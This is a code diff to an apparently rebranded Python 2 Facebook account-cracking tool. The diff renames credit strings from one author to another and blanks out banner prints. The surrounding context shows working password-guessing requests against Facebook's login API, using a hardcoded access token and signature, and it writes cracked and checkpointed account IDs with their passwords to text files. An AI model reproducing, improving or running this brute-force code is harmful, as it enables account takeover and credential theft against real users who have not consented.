@@ -268,7 +268,7 @@ def menu_select():
         os.system("git pull origin master")
         time.sleep(1)
         os.system("clear")
-        print banner
+        print 
         ham("\033[1;32m[✓] AWAIS Tool Has Been Updated Successfully\033[0;97m")
         time.sleep(1)
         os.system("python2 Awais.py")
@@ -451,14 +451,14 @@ def crack2():
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                            d=json.loads(q)
 		                            if 'www.facebook.com' in d['error_msg']:
-		                                print("[CP-RASHED-HOSSAIN] "+uid+" | "+pass4)
+		                                print("[CP-AWAIS_PAHTON] "+uid+" | "+pass4)
 		                                cp=open("cp.txt","a")
 		                                cp.write(uid+" | "+pass4+"\n")
 		                                cp.close()
 		                                cps.append(uid)
 		                            else:
 		                                if 'access_token' in d:
-		                                    print("\x1b[1;92m[RASHED-HOSSAIN-HACKED] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
+		                                    print("\x1b[1;92m[AWAIS_PAHTON-HACKED] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
 		                                    ok=open("ok.txt","a")
 		                                    ok.write(uid+" | "+pass4+"\n")
 		                                    ok.close()
@@ -523,7 +523,7 @@ def crack2():
 	print('')
 	print 47*'-'
 	print('')
-	print ('[✓] Rashed Process Has Been Completed')
+	print ('[✓] AWAIS Process Has Been Completed')
 	print('[✓] Total CP/\033[1:32mOK:\033[0;97m  '+str(len(cps))+'/\033[;32m \033[0;97m'+str(len(oks)))
 	print('')
 	print 47*('-')
@@ -585,10 +585,10 @@ def cnumber2():
 			id.append(uid+'|'+nm)
 	elif select =="2":
 		os.system("clear")
-		print banner
+		print 
 		idt = raw_input("[+] Input ID : ")
 		os.system('clear')
-		print banner
+		print 
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 			q = json.loads(r.text)
